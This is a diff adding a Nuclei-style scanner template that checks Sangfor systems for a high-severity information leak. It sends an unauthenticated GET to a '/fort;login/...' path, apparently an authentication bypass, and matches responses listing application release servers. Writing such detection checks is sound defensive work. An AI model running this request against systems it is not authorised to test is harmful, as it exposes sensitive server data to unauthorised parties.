@@ -1,0 +1,27 @@
+id: SangFor-get_all_application_release-InfoLeak
+
+info:
+  name: SangFor-get_all_application_release-InfoLeak
+  author: iSee857
+  severity: high
+  description: |
+    SangFor-get_all_application_release-InfoLeak
+  tags: sangfor
+http:
+  - raw:
+      - |
+        GET /fort;login/app/get_all_application_release HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'fortApplicationAeleaseServers'
+          - 'success'
+        condition: and
+
+      - type: status
+        status:
+          - 200
